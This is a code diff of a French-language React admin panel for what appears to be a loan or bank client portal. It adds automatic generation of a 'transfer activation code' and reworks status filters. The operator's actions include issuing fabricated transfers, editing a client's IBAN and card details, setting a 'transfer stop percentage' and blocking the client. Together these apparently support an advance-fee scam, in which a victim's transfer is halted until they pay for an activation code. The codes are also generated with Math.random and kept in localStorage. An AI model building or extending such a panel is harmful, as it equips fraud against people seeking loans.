@@ -228,23 +228,30 @@ const applyAdminAction = () => {
     return;
   }
 
-  if (selectedAction !== "reset_transfers" && !actionValue.trim()) {
-    alert("Entrez une valeur pour cette action.");
-    return;
-  }
+  if (
+  selectedAction !== "reset_transfers" &&
+  selectedAction !== "activation_code" &&
+  !actionValue.trim()
+) {
+  alert("Entrez une valeur pour cette action.");
+  return;
+}
 
   const value = actionValue.trim();
 
   switch (selectedAction) {
     case "activation_code": {
-      localStorage.setItem(
-        `adminActivationCode_${selectedDemande.id}`,
-        value.toUpperCase()
-      );
+  const generatedCode =
+    value || Math.random().toString(36).substring(2, 10).toUpperCase();
 
-      alert("Code d’activation virement mis à jour.");
-      break;
-    }
+  localStorage.setItem(
+    `adminActivationCode_${selectedDemande.id}`,
+    generatedCode
+  );
+
+  alert(`Code d’activation généré : ${generatedCode}`);
+  break;
+}
 
     case "transfer_stop": {
       const percent = Number(value);
@@ -636,20 +643,15 @@ const justificatifs =
                       </SelectTrigger>
 
                      <SelectContent className="bg-white text-black border border-zinc-200 shadow-2xl rounded-2xl">
-  <SelectItem value="transfer_in">Émettre un virement entrant</SelectItem>
-  <SelectItem value="transfer_out">Émettre un virement sortant</SelectItem>
-  <SelectItem value="refund">Émettre un remboursement</SelectItem>
-  <SelectItem value="notification">Nouvelle notification à afficher</SelectItem>
-  <SelectItem value="theme">Changer la couleur de l'interface</SelectItem>
-  <SelectItem value="language">Changer la langue d'affichage</SelectItem>
-  <SelectItem value="card">Changer les informations de la CB</SelectItem>
-  <SelectItem value="iban">Changer l'IBAN et le BIC du compte</SelectItem>
-  <SelectItem value="currency">Changer la devise du compte</SelectItem>
-  <SelectItem value="pin">Changer le code PIN de connexion</SelectItem>
-  <SelectItem value="activation_code">Changer le code d'activation virement</SelectItem>
-  <SelectItem value="transfer_stop">Nouveau pourcentage d'arrêt virement</SelectItem>
-  <SelectItem value="reset_transfers">Réinitialiser l'historique des virements</SelectItem>
-  <SelectItem value="block_client">Bloquer ou débloquer l'accès client</SelectItem>
+  <SelectItem value="Tous">Tous</SelectItem>
+  <SelectItem value="En cours">⏳ En cours</SelectItem>
+  <SelectItem value="Documents reçus">📄 Documents reçus</SelectItem>
+  <SelectItem value="Vérification finale">🔎 Vérification finale</SelectItem>
+  <SelectItem value="Accepté">✅ Accepté</SelectItem>
+  <SelectItem value="Décaissement en préparation">🏦 Décaissement</SelectItem>
+  <SelectItem value="Fonds mis à disposition">💳 Mise à disposition</SelectItem>
+  <SelectItem value="Fonds transférés">💸 Fonds transférés</SelectItem>
+  <SelectItem value="Refusé">❌ Refusé</SelectItem>
 </SelectContent>
                     </Select>
                   </div>
@@ -946,7 +948,7 @@ const justificatifs =
                           <SelectValue />
                         </SelectTrigger>
 
-                        <SelectContent>
+                        <SelectContent className="bg-white text-black border border-zinc-200 shadow-2xl rounded-2xl">
   <SelectItem value="En cours">⏳ En cours</SelectItem>
   <SelectItem value="Documents reçus">📄 Documents reçus</SelectItem>
   <SelectItem value="Vérification finale">🔎 Vérification finale</SelectItem>
@@ -995,7 +997,7 @@ const justificatifs =
       <SelectValue placeholder="Choisir une action" />
     </SelectTrigger>
 
-    <SelectContent>
+    <SelectContent className="bg-white text-black border border-zinc-200 shadow-2xl rounded-2xl">
       <SelectItem value="transfer_in">Émettre un virement entrant</SelectItem>
       <SelectItem value="transfer_out">Émettre un virement sortant</SelectItem>
       <SelectItem value="refund">Émettre un remboursement</SelectItem>
@@ -1006,7 +1008,7 @@ const justificatifs =
       <SelectItem value="iban">Changer l'IBAN et le BIC du compte</SelectItem>
       <SelectItem value="currency">Changer la devise du compte</SelectItem>
       <SelectItem value="pin">Changer le code PIN de connexion</SelectItem>
-      <SelectItem value="activation_code">Changer le code d'activation virement</SelectItem>
+      <SelectItem value="activation_code">Générer / changer le code d'activation virement</SelectItem>
       <SelectItem value="transfer_stop">Nouveau pourcentage d'arrêt virement</SelectItem>
       <SelectItem value="reset_transfers">Réinitialiser l'historique des virements</SelectItem>
       <SelectItem value="block_client">Bloquer ou débloquer l'accès client</SelectItem>
@@ -1019,7 +1021,7 @@ const justificatifs =
       onChange={(e) => setActionValue(e.target.value)}
       placeholder={
         selectedAction === "activation_code"
-          ? "Exemple : 95AEE4B7"
+          ? "Laisser vide pour générer automatiquement"
           : selectedAction === "transfer_stop"
           ? "Pourcentage entre 0 et 100"
           : selectedAction === "block_client"
